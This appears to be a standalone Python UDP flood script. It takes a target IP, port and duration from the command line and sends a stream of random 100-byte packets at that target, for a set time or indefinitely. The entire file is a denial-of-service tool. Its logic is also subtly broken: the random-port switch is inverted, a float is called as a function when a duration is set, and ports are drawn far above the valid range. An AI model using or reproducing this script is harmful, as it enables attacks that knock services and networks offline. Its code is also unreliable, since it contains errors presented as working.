#!/usr/bin/python
import socket
import sys
import time
import random

if len(sys.argv) != 4:
    sys.exit('Usage: f.py ip port(0=random) length(0=forever)')

def UDPFlood():
    port = int(sys.argv[2])
    randport = (True, False)[port == 0]
    ip = sys.argv[1]
    dur = int(sys.argv[3])
    clock = (lambda: 0, time.time())[dur > 0]
    duration = (1, clock() + dur)[dur > 0]

    print(f'Flooding {ip}:{port} for {dur or "infinite"} seconds with custom bytes length')

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while True:
        port = (random.randint(1, 15000000), port)[randport]
        if clock() < duration:
            # Generate custom byte length 100
            custom_byte_length = 100
            custom_bytes = bytes(random.randint(0, 255) for _ in range(custom_byte_length))

            # Send the customized bytes
            sock.sendto(custom_bytes, (ip, port))
        else:
            break

    print('DONE')

UDPFlood()
